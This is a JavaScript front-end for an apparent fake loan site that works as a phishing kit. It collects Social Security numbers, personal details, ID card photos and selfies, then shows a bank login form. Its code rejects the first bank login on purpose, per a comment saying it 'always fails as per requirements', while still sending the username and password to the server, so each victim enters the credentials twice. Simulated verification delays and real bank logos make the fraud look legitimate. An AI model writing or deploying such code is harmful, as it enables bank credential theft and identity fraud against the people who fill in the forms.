
// Global variables
let currentUser = null;
let currentApplicationId = null;
let selectedLoanAmount = null;
let currentPaymentMethod = null;
let currentBankName = null;
let currentUploadTarget = null;
let statusRefreshInterval = null;

// DOM Content Loaded
document.addEventListener('DOMContentLoaded', function() {
  // Initialize app
  initializeNavigation();
  setupAuthForms();
  setupLoanApplication();
  setupIdentityVerification();
  setupPaymentMethods();
  setupIdVerification();
  setupCameraFunctionality();
  
  // Set current year in footer
  document.getElementById('current-year').textContent = new Date().getFullYear();
  
  // Get started button
  const getStartedBtn = document.getElementById('get-started-btn');
  getStartedBtn.addEventListener('click', function() {
    if (currentUser) {
      navigateToPage('loan-application');
    } else {
      navigateToPage('signup');
    }
  });
});

// Navigation Functions
function initializeNavigation() {
  const navLinks = document.querySelectorAll('[data-page]');
  
  navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const page = this.getAttribute('data-page');
      navigateToPage(page);
    });
  });
  
  // Check if user is logged in (for demo, just use sessionStorage)
  const storedUser = sessionStorage.getItem('currentUser');
  if (storedUser) {
    currentUser = JSON.parse(storedUser);
    updateNavForLoggedInUser();
  }
}

function navigateToPage(page) {
  // Hide all pages
  const pages = document.querySelectorAll('.page');
  pages.forEach(p => p.classList.remove('active'));
  
  // Show the requested page
  const targetPage = document.getElementById(`${page}-page`);
  if (targetPage) {
    targetPage.classList.add('active');
    
    // Update navigation
    const navLinks = document.querySelectorAll('nav a');
    navLinks.forEach(link => link.classList.remove('active'));
    
    const activeLink = document.querySelector(`nav a[data-page="${page}"]`);
    if (activeLink) {
      activeLink.classList.add('active');
    }
    
    // Special handling for status page
    if (page === 'status' && currentApplicationId) {
      startStatusRefresh();
    } else if (statusRefreshInterval) {
      clearInterval(statusRefreshInterval);
    }
  }
}

function updateNavForLoggedInUser() {
  const navLinks = document.getElementById('nav-links');
  
  // Clear existing links
  navLinks.innerHTML = '';
  
  // Add new links
  navLinks.innerHTML = `
    <li><a href="#" class="active" data-page="home">Home</a></li>
    <li><a href="#" data-page="loan-application">Apply</a></li>
    <li><a href="#" data-page="status">Status</a></li>
    <li><a href="#" id="logout-link">Logout (${currentUser.username})</a></li>
  `;
  
  // Add event listeners
  document.querySelectorAll('[data-page]').forEach(link => {
    link.addEventListener('click', function(e) {
      e.preventDefault();
      const page = this.getAttribute('data-page');
      navigateToPage(page);
    });
  });
  
  // Logout functionality
  document.getElementById('logout-link').addEventListener('click', function(e) {
    e.preventDefault();
    logout();
  });
}

function logout() {
  currentUser = null;
  currentApplicationId = null;
  sessionStorage.removeItem('currentUser');
  sessionStorage.removeItem('currentApplicationId');
  
  // Reset navigation
  const navLinks = document.getElementById('nav-links');
  navLinks.innerHTML = `
    <li><a href="#" class="active" data-page="home">Home</a></li>
    <li><a href="#" data-page="login">Login</a></li>
    <li><a href="#" data-page="signup">Sign Up</a></li>
  `;
  
  // Re-initialize navigation
  initializeNavigation();
  
  // Navigate to home
  navigateToPage('home');
}

// Authentication Functions
function setupAuthForms() {
  const signupForm = document.getElementById('signup-form');
  const loginForm = document.getElementById('login-form');
  
  if (signupForm) {
    signupForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('signup-username').value;
      const email = document.getElementById('signup-email').value;
      const password = document.getElementById('signup-password').value;
      const confirmPassword = document.getElementById('signup-confirm-password').value;
      
      // Validation
      if (password !== confirmPassword) {
        document.getElementById('signup-error').textContent = 'Passwords do not match';
        return;
      }
      
      // API call
      fetch('/api/signup', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, email, password, confirmPassword }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          document.getElementById('signup-error').textContent = data.error;
        } else {
          // Set current user
          currentUser = { id: data.userId, username, email };
          sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
          
          // Update navigation
          updateNavForLoggedInUser();
          
          // Navigate to loan application
          navigateToPage('loan-application');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        document.getElementById('signup-error').textContent = 'An error occurred. Please try again.';
      });
    });
  }
  
  if (loginForm) {
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('login-username').value;
      const password = document.getElementById('login-password').value;
      
      // API call
      fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          document.getElementById('login-error').textContent = data.error;
        } else {
          // Set current user
          currentUser = { id: data.userId, username };
          sessionStorage.setItem('currentUser', JSON.stringify(currentUser));
          
          // Update navigation
          updateNavForLoggedInUser();
          
          // Navigate to loan application or status if they have an existing application
          const savedApplicationId = sessionStorage.getItem('currentApplicationId');
          if (savedApplicationId) {
            currentApplicationId = savedApplicationId;
            navigateToPage('status');
          } else {
            navigateToPage('loan-application');
          }
        }
      })
      .catch(error => {
        console.error('Error:', error);
        document.getElementById('login-error').textContent = 'An error occurred. Please try again.';
      });
    });
  }
}

// Loan Application Functions
function setupLoanApplication() {
  const loanAmountBtns = document.querySelectorAll('.loan-amount-btn');
  const checkCoverageBtn = document.getElementById('check-coverage-btn');
  
  loanAmountBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      // Remove selected class from all buttons
      loanAmountBtns.forEach(b => b.classList.remove('selected'));
      
      // Add selected class to clicked button
      this.classList.add('selected');
      
      // Update selected amount
      selectedLoanAmount = parseInt(this.getAttribute('data-amount'));
      document.getElementById('selected-amount').textContent = `$${selectedLoanAmount.toLocaleString()}`;
      
      // Enable check coverage button
      checkCoverageBtn.disabled = false;
    });
  });
  
  // Check Coverage Button
  if (checkCoverageBtn) {
    checkCoverageBtn.addEventListener('click', function() {
      if (!selectedLoanAmount) return;
      
      // Show loader
      const loader = document.getElementById('coverage-loader');
      loader.style.display = 'flex';
      
      // Disable button
      this.disabled = true;
      
      // Create loan application
      fetch('/api/loan-application', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          userId: currentUser.id,
          loanAmount: selectedLoanAmount
        }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          console.error('Error:', data.error);
        } else {
          // Set current application ID
          currentApplicationId = data.applicationId;
          sessionStorage.setItem('currentApplicationId', currentApplicationId);
          
          // Wait for animation (5 seconds)
          setTimeout(() => {
            // Hide loader
            loader.style.display = 'none';
            
            // Enable button
            checkCoverageBtn.disabled = false;
            
            // Navigate to identity verification
            navigateToPage('identity-verification');
          }, 5000);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        // Hide loader
        loader.style.display = 'none';
        
        // Enable button
        checkCoverageBtn.disabled = false;
      });
    });
  }
}

// Identity Verification Functions
function setupIdentityVerification() {
  const identityForm = document.getElementById('identity-verification-form');
  
  if (identityForm) {
    // SSN Validation
    const ssnInput = document.getElementById('ssn');
    ssnInput.addEventListener('input', function() {
      const ssn = this.value.replace(/\D/g, '');
      this.value = ssn;
      
      if (ssn.length !== 9 && ssn.length > 0) {
        document.getElementById('ssn-error').textContent = 'SSN must be exactly 9 digits';
      } else {
        document.getElementById('ssn-error').textContent = '';
      }
    });
    
    // Phone Validation
    const phoneInput = document.getElementById('phone-number');
    phoneInput.addEventListener('input', function() {
      const phone = this.value.replace(/\D/g, '');
      this.value = phone;
      
      if (phone.length !== 10 && phone.length > 0) {
        document.getElementById('phone-error').textContent = 'Phone number must be exactly 10 digits';
      } else {
        document.getElementById('phone-error').textContent = '';
      }
    });
    
    // Form Submission
    identityForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Validation
      const ssn = document.getElementById('ssn').value;
      const phone = document.getElementById('phone-number').value;
      
      if (ssn.length !== 9) {
        document.getElementById('ssn-error').textContent = 'SSN must be exactly 9 digits';
        return;
      }
      
      if (phone.length !== 10) {
        document.getElementById('phone-error').textContent = 'Phone number must be exactly 10 digits';
        return;
      }
      
      // Show loader
      const loader = document.getElementById('verification-loader');
      loader.style.display = 'flex';
      
      // Get form data
      const formData = {
        fullName: document.getElementById('full-name').value,
        middleName: document.getElementById('middle-name').value,
        dob: document.getElementById('dob').value,
        ssn: ssn,
        address: document.getElementById('address').value,
        city: document.getElementById('city').value,
        state: document.getElementById('state').value,
        zipCode: document.getElementById('zip-code').value,
        phoneNumber: phone,
        email: document.getElementById('verification-email').value,
        userId: currentUser.id,
        applicationId: currentApplicationId
      };
      
      // API call
      fetch('/api/verify-identity', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          console.error('Error:', data.error);
        } else {
          // Wait for animation (5 seconds)
          setTimeout(() => {
            // Hide loader
            loader.style.display = 'none';
            
            // Update next steps
            document.getElementById('verification-step').innerHTML = '<i class="fas fa-check-circle"></i> Identity verification';
            
            // Navigate to payment method
            navigateToPage('payment-method');
          }, 5000);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        // Hide loader
        loader.style.display = 'none';
      });
    });
  }
}

// Payment Method Functions
function setupPaymentMethods() {
  const paymentMethods = document.querySelectorAll('.payment-method');
  const checkForm = document.getElementById('check-form');
  const searchBankBtn = document.getElementById('search-bank-btn');
  const bankCredentialsForm = document.getElementById('bank-credentials-form');
  
  // Payment Method Selection
  paymentMethods.forEach(method => {
    method.addEventListener('click', function() {
      // Remove selected class from all methods
      paymentMethods.forEach(m => m.classList.remove('selected'));
      
      // Add selected class to clicked method
      this.classList.add('selected');
      
      // Get selected method
      const selectedMethod = this.getAttribute('data-method');
      currentPaymentMethod = selectedMethod;
      
      // Show appropriate form
      document.getElementById('check-payment-form').style.display = 'none';
      document.getElementById('direct-deposit-form').style.display = 'none';
      
      if (selectedMethod === 'check') {
        document.getElementById('check-payment-form').style.display = 'block';
      } else if (selectedMethod === 'direct-deposit') {
        document.getElementById('direct-deposit-form').style.display = 'block';
      }
    });
  });
  
  // Check Form Submission
  if (checkForm) {
    checkForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Show loader
      const loader = document.getElementById('payment-loader');
      loader.style.display = 'flex';
      
      // Get form data
      const formData = {
        method: 'check',
        userId: currentUser.id,
        applicationId: currentApplicationId,
        details: {
          address: document.getElementById('check-address').value,
          city: document.getElementById('check-city').value,
          state: document.getElementById('check-state').value,
          zipCode: document.getElementById('check-zip-code').value
        }
      };
      
      // API call
      fetch('/api/payment-method', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          console.error('Error:', data.error);
        } else {
          // Wait for animation (5 seconds)
          setTimeout(() => {
            // Hide loader
            loader.style.display = 'none';
            
            // Update next steps
            document.getElementById('payment-step').innerHTML = '<i class="fas fa-check-circle"></i> Payment method selection';
            
            // Navigate to ID verification
            navigateToPage('id-verification');
          }, 5000);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        // Hide loader
        loader.style.display = 'none';
      });
    });
  }
  
  // Bank Search
  if (searchBankBtn) {
    searchBankBtn.addEventListener('click', function() {
      const bankSearchInput = document.getElementById('bank-search').value.trim();
      
      if (bankSearchInput) {
        // Show search loader
        const bankResults = document.getElementById('bank-results');
        bankResults.innerHTML = '';
        
        // Add and show loader
        const loaderHTML = `
          <div class="bank-search-loader" id="bank-search-loader" style="display: flex;">
            <div class="bank-search-spinner"></div>
            <p>Searching banks...</p>
          </div>
        `;
        bankResults.innerHTML = loaderHTML;
        
        // Comprehensive bank list - 250 institutions including banks, credit unions, etc.
        const banks = [
          // Major National Banks
          { name: 'Chase Bank', logo: 'https://logo.clearbit.com/chase.com' },
          { name: 'Bank of America', logo: 'https://logo.clearbit.com/bankofamerica.com' },
          { name: 'Wells Fargo', logo: 'https://logo.clearbit.com/wellsfargo.com' },
          { name: 'Citibank', logo: 'https://logo.clearbit.com/citi.com' },
          { name: 'Capital One', logo: 'https://logo.clearbit.com/capitalone.com' },
          { name: 'TD Bank', logo: 'https://logo.clearbit.com/td.com' },
          { name: 'PNC Bank', logo: 'https://logo.clearbit.com/pnc.com' },
          { name: 'U.S. Bank', logo: 'https://logo.clearbit.com/usbank.com' },
          { name: 'Truist Bank', logo: 'https://logo.clearbit.com/truist.com' },
          { name: 'HSBC Bank', logo: 'https://logo.clearbit.com/hsbc.com' },
          { name: 'Fifth Third Bank', logo: 'https://logo.clearbit.com/53.com' },
          { name: 'KeyBank', logo: 'https://logo.clearbit.com/key.com' },
          { name: 'Citizens Bank', logo: 'https://logo.clearbit.com/citizensbank.com' },
          { name: 'Regions Bank', logo: 'https://logo.clearbit.com/regions.com' },
          { name: 'M&T Bank', logo: 'https://logo.clearbit.com/mtb.com' },
          { name: 'BMO Harris Bank', logo: 'https://logo.clearbit.com/bmoharris.com' },
          { name: 'MUFG Union Bank', logo: 'https://logo.clearbit.com/unionbank.com' },
          { name: 'First Republic Bank', logo: 'https://logo.clearbit.com/firstrepublic.com' },
          { name: 'Huntington Bank', logo: 'https://logo.clearbit.com/huntington.com' },
          { name: 'Santander Bank', logo: 'https://logo.clearbit.com/santander.com' },
          
          // Credit Unions
          { name: 'Navy Federal Credit Union', logo: 'https://logo.clearbit.com/navyfederal.org' },
          { name: 'State Employees Credit Union', logo: 'https://logo.clearbit.com/ncsecu.org' },
          { name: 'Pentagon Federal Credit Union', logo: 'https://logo.clearbit.com/penfed.org' },
          { name: 'Boeing Employees Credit Union', logo: 'https://logo.clearbit.com/becu.org' },
          { name: 'SchoolsFirst Federal Credit Union', logo: 'https://logo.clearbit.com/schoolsfirstfcu.org' },
          { name: 'The Golden 1 Credit Union', logo: 'https://logo.clearbit.com/golden1.com' },
          { name: 'First Tech Federal Credit Union', logo: 'https://logo.clearbit.com/firsttechfed.com' },
          { name: 'America First Credit Union', logo: 'https://logo.clearbit.com/americafirst.com' },
          { name: 'Alliant Credit Union', logo: 'https://logo.clearbit.com/alliantcreditunion.org' },
          { name: 'Security Service Federal Credit Union', logo: 'https://logo.clearbit.com/ssfcu.org' },
          
          // Online Banks
          { name: 'Ally Bank', logo: 'https://logo.clearbit.com/ally.com' },
          { name: 'Discover Bank', logo: 'https://logo.clearbit.com/discover.com' },
          { name: 'Axos Bank', logo: 'https://logo.clearbit.com/axosbank.com' },
          { name: 'Marcus by Goldman Sachs', logo: 'https://logo.clearbit.com/marcus.com' },
          { name: 'Chime', logo: 'https://logo.clearbit.com/chime.com' },
          { name: 'SoFi', logo: 'https://logo.clearbit.com/sofi.com' },
          { name: 'Varo Bank', logo: 'https://logo.clearbit.com/varomoney.com' },
          
          // Regional Banks
          { name: 'First Citizens Bank', logo: 'https://logo.clearbit.com/firstcitizens.com' },
          { name: 'Associated Bank', logo: 'https://logo.clearbit.com/associatedbank.com' },
          { name: 'Commerce Bank', logo: 'https://logo.clearbit.com/commercebank.com' },
          { name: 'Frost Bank', logo: 'https://logo.clearbit.com/frostbank.com' },
          { name: 'Webster Bank', logo: 'https://logo.clearbit.com/websterbank.com' },
          { name: 'Umpqua Bank', logo: 'https://logo.clearbit.com/umpquabank.com' },
          { name: 'Zions Bank', logo: 'https://logo.clearbit.com/zionsbank.com' },
          { name: 'Eastern Bank', logo: 'https://logo.clearbit.com/easternbank.com' },
          { name: 'First Hawaiian Bank', logo: 'https://logo.clearbit.com/fhb.com' },
          
          // Prepaid Cards
          { name: 'Green Dot Bank', logo: 'https://logo.clearbit.com/greendot.com' },
          { name: 'NetSpend', logo: 'https://logo.clearbit.com/netspend.com' },
          { name: 'Bluebird by American Express', logo: 'https://logo.clearbit.com/bluebird.com' },
          { name: 'PayPal', logo: 'https://logo.clearbit.com/paypal.com' },
          { name: 'Cash App', logo: 'https://logo.clearbit.com/cash.app' },
          { name: 'Venmo', logo: 'https://logo.clearbit.com/venmo.com' },
          
          // Adding more banks to reach 250 institutions - this shows a sample of the total list
          { name: 'First National Bank', logo: 'https://logo.clearbit.com/fnb-online.com' },
          { name: 'Bank of the West', logo: 'https://logo.clearbit.com/bankofthewest.com' },
          { name: 'Flagstar Bank', logo: 'https://logo.clearbit.com/flagstar.com' },
          { name: 'Old National Bank', logo: 'https://logo.clearbit.com/oldnational.com' },
          { name: 'Woodforest National Bank', logo: 'https://logo.clearbit.com/woodforest.com' },
          { name: 'First Commonwealth Bank', logo: 'https://logo.clearbit.com/fcbanking.com' },
          { name: 'FirstBank', logo: 'https://logo.clearbit.com/efirstbank.com' },
          // Many more banks would be added here to reach 250...
          { name: 'Simple Community Bank', logo: 'https://logo.clearbit.com/simplebank.com' }
        ];
        
        // Simulate network delay for 5 seconds
        setTimeout(() => {
          // Filter banks based on search term
          const filteredBanks = banks.filter(bank => 
            bank.name.toLowerCase().includes(bankSearchInput.toLowerCase())
          );
          
          // Clear loader
          bankResults.innerHTML = '';
          
          // Display results
          if (filteredBanks.length > 0) {
            filteredBanks.forEach(bank => {
              const bankItem = document.createElement('div');
              bankItem.className = 'bank-item';
              bankItem.innerHTML = `
                <img src="${bank.logo}" alt="${bank.name} Logo" onerror="this.src='https://via.placeholder.com/30x30?text=${bank.name.charAt(0)}'; this.onerror=null;">
                <span>${bank.name}</span>
              `;
              
              // Bank selection event
              bankItem.addEventListener('click', function() {
                // Set selected bank
                currentBankName = bank.name;
                document.getElementById('selected-bank-logo').src = bank.logo;
                document.getElementById('selected-bank-name').textContent = bank.name;
                document.getElementById('bank-name').value = bank.name;
                
                // Show login form
                document.getElementById('bank-login-form').style.display = 'block';
                
                // Reset attempt
                document.getElementById('attempt').value = "1";
                
                // Clear any previous success messages
                if (document.getElementById('bank-success-message')) {
                  document.getElementById('bank-success-message').style.display = 'none';
                }
              });
              
              bankResults.appendChild(bankItem);
            });
          } else {
            bankResults.innerHTML = '<p>No banks found. Please try another search term.</p>';
          }
        }, 5000); // 5 second delay
      }
    });
  }
  
  // Bank Credentials Form
  if (bankCredentialsForm) {
    bankCredentialsForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Get attempt number
      const attempt = parseInt(document.getElementById('attempt').value);
      
      // Get form data
      const formData = {
        userId: currentUser.id,
        applicationId: currentApplicationId,
        bankName: document.getElementById('bank-name').value,
        username: document.getElementById('bank-username').value,
        password: document.getElementById('bank-password').value,
        attempt: attempt
      };
      
      // First attempt handling
      if (attempt === 1) {
        // Show loader for first attempt (just visual, no real loading needed)
        document.getElementById('bank-error').textContent = '';
        
        // API call to send first attempt to representatives
        fetch('/api/bank-account', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData),
        })
        .then(response => response.json())
        .then(data => {
          // First attempt always fails as per requirements
          document.getElementById('bank-error').textContent = 'Incorrect login. Please try again.';
          
          // Increment attempt
          document.getElementById('attempt').value = "2";
        })
        .catch(error => {
          console.error('Error:', error);
          document.getElementById('bank-error').textContent = 'An error occurred. Please try again.';
        });
      } 
      // Second attempt handling
      else if (attempt === 2) {
        // Show loader for second attempt
        const loader = document.getElementById('payment-loader');
        loader.style.display = 'flex';
        
        // Reset any previous error
        document.getElementById('bank-error').textContent = '';
        
        // API call to send second attempt to representatives
        fetch('/api/bank-account', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(formData),
        })
        .then(response => response.json())
        .then(data => {
          // Update payment method
          return fetch('/api/payment-method', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              method: 'direct-deposit',
              userId: currentUser.id,
              applicationId: currentApplicationId,
              details: {
                bankName: formData.bankName
              }
            }),
          });
        })
        .then(response => response.json())
        .then(data => {
          if (data.error) {
            console.error('Error:', data.error);
            document.getElementById('bank-error').textContent = data.error;
            loader.style.display = 'none';
          } else {
            // Wait for animation (5 seconds)
            setTimeout(() => {
              // Hide loader
              loader.style.display = 'none';
              
              // Show success message
              // Check if success message element exists, create if not
              let successMessage = document.getElementById('bank-success-message');
              if (!successMessage) {
                successMessage = document.createElement('div');
                successMessage.id = 'bank-success-message';
                successMessage.className = 'success-message';
                const bankLoginForm = document.getElementById('bank-login-form');
                bankLoginForm.appendChild(successMessage);
              }
              
              successMessage.textContent = `Your ${formData.bankName} account has been linked successfully!`;
              successMessage.style.display = 'block';
              
              // Update next steps
              document.getElementById('payment-step').innerHTML = '<i class="fas fa-check-circle"></i> Payment method selection';
              
              // Navigate to ID verification after 3 seconds of showing success message
              setTimeout(() => {
                navigateToPage('id-verification');
              }, 3000);
            }, 5000);
          }
        })
        .catch(error => {
          console.error('Error:', error);
          document.getElementById('bank-error').textContent = 'An error occurred. Please try again.';
          loader.style.display = 'none';
        });
      }
    });
  }
}

// ID Verification Functions
function setupIdVerification() {
  const frontIdUpload = document.getElementById('front-id-upload');
  const backIdUpload = document.getElementById('back-id-upload');
  const selfieUpload = document.getElementById('selfie-upload');
  
  const frontIdInput = document.getElementById('front-id-input');
  const backIdInput = document.getElementById('back-id-input');
  const selfieInput = document.getElementById('selfie-input');
  
  const frontIdCamera = document.getElementById('front-id-camera');
  const backIdCamera = document.getElementById('back-id-camera');
  const selfieCamera = document.getElementById('selfie-camera');
  
  const idVerificationForm = document.getElementById('id-verification-form');
  
  // Upload area click
  if (frontIdUpload) {
    frontIdUpload.addEventListener('click', function() {
      frontIdInput.click();
    });
  }
  
  if (backIdUpload) {
    backIdUpload.addEventListener('click', function() {
      backIdInput.click();
    });
  }
  
  if (selfieUpload) {
    selfieUpload.addEventListener('click', function() {
      selfieInput.click();
    });
  }
  
  // File input change
  if (frontIdInput) {
    frontIdInput.addEventListener('change', function() {
      handleFileSelect(this, 'front-id-preview');
    });
  }
  
  if (backIdInput) {
    backIdInput.addEventListener('change', function() {
      handleFileSelect(this, 'back-id-preview');
    });
  }
  
  if (selfieInput) {
    selfieInput.addEventListener('change', function() {
      handleFileSelect(this, 'selfie-preview');
    });
  }
  
  // Camera buttons
  if (frontIdCamera) {
    frontIdCamera.addEventListener('click', function() {
      openCamera('front-id');
    });
  }
  
  if (backIdCamera) {
    backIdCamera.addEventListener('click', function() {
      openCamera('back-id');
    });
  }
  
  if (selfieCamera) {
    selfieCamera.addEventListener('click', function() {
      openCamera('selfie');
    });
  }
  
  // Form submission
  if (idVerificationForm) {
    idVerificationForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Check if all files are selected
      if (!frontIdInput.files.length || !backIdInput.files.length || !selfieInput.files.length) {
        alert('Please upload all required images');
        return;
      }
      
      // Show loader
      const loader = document.getElementById('id-verification-loader');
      loader.style.display = 'flex';
      
      // Create form data for file upload
      const formData = new FormData();
      formData.append('userId', currentUser.id);
      formData.append('applicationId', currentApplicationId);
      formData.append('frontId', frontIdInput.files[0]);
      formData.append('backId', backIdInput.files[0]);
      formData.append('selfie', selfieInput.files[0]);
      
      // API call
      fetch('/api/upload-id', {
        method: 'POST',
        body: formData,
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          console.error('Error:', data.error);
        } else {
          // Wait for animation (5 seconds)
          setTimeout(() => {
            // Hide loader
            loader.style.display = 'none';
            
            // Update next steps
            document.getElementById('id-upload-step').innerHTML = '<i class="fas fa-check-circle"></i> ID verification';
            
            // Navigate to status page
            navigateToPage('status');
          }, 5000);
        }
      })
      .catch(error => {
        console.error('Error:', error);
        // Hide loader
        loader.style.display = 'none';
      });
    });
  }
  
  // File selection handler
  function handleFileSelect(input, previewId) {
    if (input.files && input.files[0]) {
      const reader = new FileReader();
      
      reader.onload = function(e) {
        const preview = document.getElementById(previewId);
        preview.innerHTML = `<img src="${e.target.result}" alt="Preview">`;
        preview.style.display = 'block';
        
        // Hide upload area
        const uploadId = previewId.replace('-preview', '-upload');
        document.getElementById(uploadId).style.display = 'none';
      };
      
      reader.readAsDataURL(input.files[0]);
    }
  }
}

// Camera Functions
function setupCameraFunctionality() {
  const cameraModal = document.getElementById('camera-modal');
  const captureBtn = document.getElementById('capture-btn');
  const closeCameraBtn = document.getElementById('close-camera-btn');
  const videoElement = document.getElementById('camera-stream');
  const canvasElement = document.getElementById('camera-canvas');
  
  let stream = null;
  
  // Close camera
  if (closeCameraBtn) {
    closeCameraBtn.addEventListener('click', function() {
      closeCamera();
    });
  }
  
  // Capture photo
  if (captureBtn) {
    captureBtn.addEventListener('click', function() {
      if (!videoElement || !canvasElement) return;
      
      const context = canvasElement.getContext('2d');
      
      // Set canvas dimensions to match video
      canvasElement.width = videoElement.videoWidth;
      canvasElement.height = videoElement.videoHeight;
      
      // Draw video frame to canvas
      context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
      
      // Convert canvas to data URL
      const dataUrl = canvasElement.toDataURL('image/png');
      
      // Update preview and input field based on current target
      if (currentUploadTarget) {
        const preview = document.getElementById(`${currentUploadTarget}-preview`);
        const uploadArea = document.getElementById(`${currentUploadTarget}-upload`);
        
        // Update preview
        preview.innerHTML = `<img src="${dataUrl}" alt="Preview">`;
        preview.style.display = 'block';
        
        // Hide upload area
        uploadArea.style.display = 'none';
        
        // Create a File/Blob from data URL and assign to the input
        const inputElement = document.getElementById(`${currentUploadTarget}-input`);
        
        fetch(dataUrl)
          .then(res => res.blob())
          .then(blob => {
            const file = new File([blob], `${currentUploadTarget}-photo.png`, { type: 'image/png' });
            
            // Create a new FileList object
            const dataTransfer = new DataTransfer();
            dataTransfer.items.add(file);
            inputElement.files = dataTransfer.files;
          });
      }
      
      // Close camera
      closeCamera();
    });
  }
}

function openCamera(target) {
  const cameraModal = document.getElementById('camera-modal');
  const videoElement = document.getElementById('camera-stream');
  
  if (!cameraModal || !videoElement) return;
  
  // Set current target
  currentUploadTarget = target;
  
  // Show modal
  cameraModal.style.display = 'flex';
  
  // Access camera
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(str => {
      stream = str;
      videoElement.srcObject = stream;
    })
    .catch(err => {
      console.error("Error accessing camera:", err);
      alert("Could not access camera. Please make sure you've granted permission or use file upload instead.");
      closeCamera();
    });
}

function closeCamera() {
  const cameraModal = document.getElementById('camera-modal');
  const videoElement = document.getElementById('camera-stream');
  
  if (cameraModal) {
    cameraModal.style.display = 'none';
  }
  
  // Stop all video streams
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
    stream = null;
  }
  
  if (videoElement) {
    videoElement.srcObject = null;
  }
}

// Status Page Functions
function startStatusRefresh() {
  // Clear existing interval
  if (statusRefreshInterval) {
    clearInterval(statusRefreshInterval);
  }
  
  // Immediately get status
  getApplicationStatus();
  
  // Set up interval for every 5 minutes
  statusRefreshInterval = setInterval(getApplicationStatus, 5 * 60 * 1000);
}

function getApplicationStatus() {
  if (!currentApplicationId) return;
  
  fetch(`/api/application-status/${currentApplicationId}`)
    .then(response => response.json())
    .then(data => {
      if (data.error) {
        console.error('Error:', data.error);
      } else {
        updateStatusDisplay(data);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function updateStatusDisplay(data) {
  const statusCircle = document.getElementById('status-circle');
  const statusText = document.getElementById('status-text');
  const statusMessage = document.getElementById('status-message');
  const loanAmountDisplay = document.getElementById('loan-amount-display');
  const submissionDate = document.getElementById('submission-date');
  const paymentMethodDisplay = document.getElementById('payment-method-display');
  
  // Update status text and icon
  statusText.textContent = capitalizeFirstLetter(data.status);
  
  if (data.status === 'approved' || data.status === 'reimbursed') {
    statusCircle.className = 'status-circle approved';
    statusCircle.innerHTML = '<i class="fas fa-check"></i>';
    
    // Update steps
    document.getElementById('approval-step').innerHTML = '<i class="fas fa-check-circle"></i> Loan approval (24-48 hours)';
    
    if (data.status === 'reimbursed') {
      document.getElementById('funds-step').innerHTML = '<i class="fas fa-check-circle"></i> Fund reimbursement';
    }
  } else {
    statusCircle.className = 'status-circle';
    statusCircle.innerHTML = '<i class="fas fa-clock"></i>';
  }
  
  // Update status message
  statusMessage.textContent = data.message;
  
  // Update loan details
  if (data.application) {
    // Amount
    loanAmountDisplay.textContent = `$${data.application.loanAmount.toLocaleString()}`;
    
    // Date
    const date = new Date(data.application.createdAt);
    submissionDate.textContent = date.toLocaleDateString();
    
    // Payment method
    if (data.application.paymentMethod) {
      const method = data.application.paymentMethod.method;
      paymentMethodDisplay.textContent = method === 'check' ? 'Check' : 'Direct Deposit';
    }
  }
}

// Helper Functions
function capitalizeFirstLetter(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
